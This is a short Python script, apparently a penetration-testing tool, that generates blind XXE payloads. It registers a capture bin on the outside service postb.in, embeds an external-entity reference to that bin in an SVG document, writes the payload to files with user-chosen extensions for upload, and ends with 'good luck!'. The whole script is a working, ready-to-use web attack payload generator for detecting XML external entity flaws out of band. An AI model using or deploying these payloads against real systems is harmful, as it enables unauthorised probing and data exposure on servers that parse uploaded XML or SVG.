#!/usr/bin/python
import requests
import os
import json
import argparse
import shutil
from colorama import Fore, Back, Style 
from pathlib import Path

def createBin():
    url = 'https://postb.in/api/bin'
    response = requests.post(url)    
    dict = response.json()
    return dict['binId']
home = str(Path.home())
storage = home+"/"+"BlindXXE"
parser = argparse.ArgumentParser(description='XXE payload generator using postbin')
parser.add_argument('-f', '--filetype', metavar='FILETYPE', nargs='+',
                   help='filetype to write the payload to')
parser.add_argument('-t', '--text', action='store_true', help='output the payload text in terminal')
parser.add_argument('-c', '--clear', action='store_true', help='delete the contents of the payload folder')
args = vars(parser.parse_args());
binId=createBin()
print(Fore.GREEN+"Payload folder is at "+Fore.BLUE+storage)
payload='<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE testingxxe [ <!ENTITY xml SYSTEM "http://postb.in/'+binId+'">]><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><text x="0" y="20" font-size="20">&xml;</text></svg>'
if os.path.exists(storage)==False:
	os.makedirs(storage)
if args['clear']==True:
	for filename in os.listdir(storage):
		file_path = os.path.join(storage, filename)
		try:
			if os.path.isfile(file_path) or os.path.islink(file_path):
				os.unlink(file_path)
			elif os.path.isdir(file_path):
				shutil.rmtree(file_path)
		except Exception as e:
			print('Failed to delete %s. Reason: %s' % (file_path, e))
	print(Fore.YELLOW+'Deleted all files in payload folder')
if args['filetype']!=None:
	for type in args['filetype']:
		filepath=storage+'/'+binId+'.'+type
		file = open(filepath, 'x')
		file.write(payload)
		file.close()
		print(Fore.GREEN+'Payload '+Fore.BLUE+binId+'.'+type+Fore.GREEN+' created')
if args['text']==True:
	print(Fore.GREEN+'Here is your payload:\n'+Fore.BLUE+payload);
print(Fore.GREEN+"Bin created at "+Fore.BLUE+"https://postb.in/b/"+binId+Fore.GREEN+", good luck!")
